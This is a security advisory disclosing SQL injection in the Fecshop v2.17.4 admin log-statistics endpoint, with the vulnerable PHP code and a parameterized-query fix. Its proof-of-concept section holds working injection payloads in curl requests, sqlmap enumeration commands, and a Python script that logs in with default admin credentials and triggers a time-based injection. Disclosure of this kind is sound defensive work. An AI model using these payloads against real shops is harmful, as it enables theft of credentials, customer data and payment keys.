# [Vulnerability] Fecshop v2.17.4 — SQL Injection in /fecadmin/logtj (account/person/created_at parameters)

## Summary

The admin log statistics endpoint `/fecadmin/logtj/index` concatenates GET parameters (`account`, `person`, `created_at_lt`, `created_at_gte`) directly into SQL queries via string interpolation without parameter binding. An authenticated administrator can execute arbitrary SQL queries, dumping all database content.

## Vulnerability File

`app/appadmin/modules/Fecadmin/block/logtj/Index.php:135-172`

## Vulnerable Code

```php
$account       = CRequest::param('account');     // User input
$person        = CRequest::param('person');      // User input
$created_at_lt = $this->_param['created_at_lt']; // User input
$created_at_gte= $this->_param['created_at_gte'];// User input

$where = [];
if($account) $where[] = " account = '$account' ";           // String concat
if($person)  $where[] = " person = '$person' ";              // String concat
if($created_at_lt)  $where[] = " created_at < '$created_at_lt' ";   // String concat
if($created_at_gte) $where[] = " created_at >= '$created_at_gte' "; // String concat

$where = ' where '.implode(' and ',$where);
$sql = "select count(*) as count from (select account,person,menu,count(*) as click_count
        from $table $where group by $group) as t";
$data_count = $db->createCommand($sql, [])->queryOne();  // Empty binding
```

`createCommand($sql, [])` — the empty array `[]` means no parameter binding at all. All user input flows directly into the SQL string.

## PoC

### Manual Verification

```bash
# Boolean-based blind — 200, all rows returned
curl "http://target/fecadmin/logtj/index?account=admin'+OR+'1'='1" -b "cookies"

# Time-based blind SLEEP — response delayed 5+ seconds
curl "http://target/fecadmin/logtj/index?account=admin'%20AND%20SLEEP(5)%20AND%20'1'='1" -b "cookies"
```

### sqlmap Confirmation

```bash
# Boolean-based blind
sqlmap -u "http://target/fecadmin/logtj/index?account=admin" \
  --cookie="PHPSESSID=xxx;_identity=xxx" \
  --dbms=mysql --technique=B --batch

# Time-based blind
sqlmap -u "http://target/fecadmin/logtj/index?account=admin" \
  --cookie="PHPSESSID=xxx;_identity=xxx" \
  --dbms=mysql --technique=T --time-sec=5 --batch --dbs
```

![image-20260526165818426](Fecmall%20SQLi%20logtj.assets/image-20260526165818426.png)

### Python Time-Based Blind (Confirmed)

```python
import requests, re, time
s = requests.Session()
# Login
r = s.get("http://target/fecadmin/login/index")
csrf = re.search(r'value="([^"]+)" name="_csrf"', r.text).group(1)
s.post("http://target/fecadmin/login/index?lang=zh",
       data={"_csrf": csrf, "login[username]": "admin", "login[password]": "123456"})

# Time-based SQLi
start = time.time()
s.get("http://target/fecadmin/logtj/index?account=admin' AND SLEEP(5) AND '1'='1")
print(f"SQLi confirmed: {time.time()-start:.1f}s")  # ~5.0s
```

## Impact

- **Time-based blind SQLi confirmed** via sqlmap — extracted `fecmall` database name, table count (40 tables), and `admin_user` email column
- **Boolean-based blind** also confirmed — `account=admin' OR '1'='1` returns 200 with expanded result set vs normal request
- Can extract: admin password hashes, customer PII (email/address/phone), order data, payment API keys
- **No CSRF protection** — GET request, no token required
- Affects 4 parameters in a single function

## Affected Versions

fecshop v2.17.4 (latest release). All versions with this code pattern are affected.

## Fix

Replace string concatenation with Yii2 Query Builder or parameterized queries:

```php
// Before (vulnerable):
$where[] = " account = '$account' ";
$db->createCommand($sql, [])->queryOne();

// After (secure):
$query = (new \yii\db\Query())
    ->select(['account', 'person', 'menu', 'COUNT(*) as click_count'])
    ->from($table)
    ->andFilterWhere(['account' => $account])
    ->andFilterWhere(['person' => $person])
    ->andFilterWhere(['<', 'created_at', $created_at_lt])
    ->andFilterWhere(['>=', 'created_at', $created_at_gte])
    ->groupBy($group);
$data = $query->all();
```
